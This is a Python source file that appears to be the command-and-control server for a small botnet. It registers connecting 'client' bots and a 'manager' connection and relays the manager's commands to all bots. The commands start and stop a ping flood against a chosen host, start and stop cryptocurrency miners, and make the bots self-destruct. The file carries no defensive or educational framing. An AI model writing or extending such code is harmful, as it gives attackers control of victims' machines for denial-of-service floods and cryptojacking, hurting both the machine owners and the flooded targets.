from client import Client
import threading, time, socket

ADDR = ('127.0.0.1', 5002)
current_clients = []
address_book = []
manager = None
client_objects = []

def init_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(ADDR)
    print('\n[STARTING] Server initialzing...\n')
    main(server)



def handle_manager(conn, addr, server):
    global address_book
    connected = True
    manager = conn
    print(f'[CONNECTION] Client {addr[0]} connected')
    while connected:
                #command loop
                command = conn.recv(1024).decode('utf-8')
                
                if command == 'cliget':
                    for client in address_book:
                        address = client[0] + ':' + str(client[1])
                        conn.send(address.encode('utf-8'))
                        time.sleep(0.5)
                    #conn.send(f'{len(address_book)} clients active'.encode('utf-8'))
                    print('clients reported')
                    time.sleep(2)
                    conn.send('done'.encode('utf-8'))

                elif command =='ping':
                    hostname = conn.recv(1024).decode('utf-8')
                    time.sleep(0.5)
                    bytecount = int(conn.recv(1024).decode('utf-8'))
                    print(f'[NOTICE] pinging {hostname} with {bytecount} bytes')
                    for i, client in enumerate(client_objects):
                        client.start_ping(hostname, bytecount)
                    
                    conn.send(f'[NOTICE] pinging {hostname} with {bytecount} bytes'.encode('utf-8'))
                          
                elif command == 'stop ping':
                    for i, client in enumerate(client_objects):
                        client.stop_ping()
                    print('Stopped ping flood')
                    conn.send('Stopped ping flood'.encode('utf-8'))
                          
                elif command =='startmine':
                    print('[NOTICE] Starting Miners')
                    for i, client in enumerate(client_objects):
                        client.start_mine()
                    print(f'[NOTICE] {len(client_objects)} miners started')
                    conn.send(f'{len(client_objects)} miners started'.encode('utf-8'))
                    
                elif command =='stopmine':
                    print('[NOTICE] Stopping Miners')
                    for i, client in enumerate(client_objects):
                        client.stop_mine()
                    print(f'[NOTICE] {len(client_objects)} miners stopped')
                    conn.send(f'{len(client_objects)} miners stopped'.encode('utf-8'))
                    
                elif command =='selfdestruct':
                    print(f'[ALERT!!!] Destroying {len(client_objects)} Miners')
                    for i, client in enumerate(client_objects):
                        client.destroy()
                    print(f'[ALERT!!!] {len(client_objects)} Miners Destroyed')
                    conn.send('done.'.encode('utf-8'))
                    
                else:
                    conn.send('Invalid Command.'.encode('utf-8'))
                    time.sleep(0.5)
                    continue
            

def handle_client(conn, addr, server):
    try:
        connected = True
        client = Client(conn, addr, server)
        current_clients.append(client)
        client_objects.append(client)
        index = len(current_clients) - 1
        while connected:
            #print(f'Client {index + 1}')
            time.sleep(5)
            
                   
    except:
        print(f'\n[NOTICE] Connection with {addr[0]} closed')
        current_clients.remove(client)
            
            
    
def main(server):
    global address_book
    server.listen()
    print(f'[INFO] Listening on {ADDR[0]}:{ADDR[1]}\n')
    print(f'[WAITING] Waiting for connections...\n')
    while True:
            conn, addr = server.accept()
            managecheck = conn.recv(1024)
            if managecheck.decode('utf-8') == 'manager':
                conn.send('verified'.encode('utf-8'))
                manager = conn
                t1 = threading.Thread(target=handle_manager, args=(conn, addr, server))
                t1.start()
                managecheck = None
            elif managecheck.decode('utf-8') == 'client':
                address_book.append(addr)
                t1 = threading.Thread(target=handle_client, args=(conn, addr, server))
                t1.start()
                managecheck = None
        
            print(f'\n[ACTIVE] Miners: {threading.activeCount() - 2}\n')
        
init_server()

